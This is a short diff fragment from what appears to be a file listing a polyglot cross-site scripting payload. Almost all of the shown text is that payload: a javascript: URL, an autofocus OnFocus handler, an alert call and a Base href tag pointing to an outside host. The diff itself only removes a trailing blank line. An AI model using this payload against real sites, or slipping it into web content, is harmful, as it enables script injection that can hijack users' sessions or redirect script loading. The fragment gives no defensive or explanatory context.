@@ -9,4 +9,3 @@ JavaScript://%250Aalert?.(1)//
 \74k<K/contentEditable/autoFocus/OnFocus=
 /*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76--> 
 ```
-
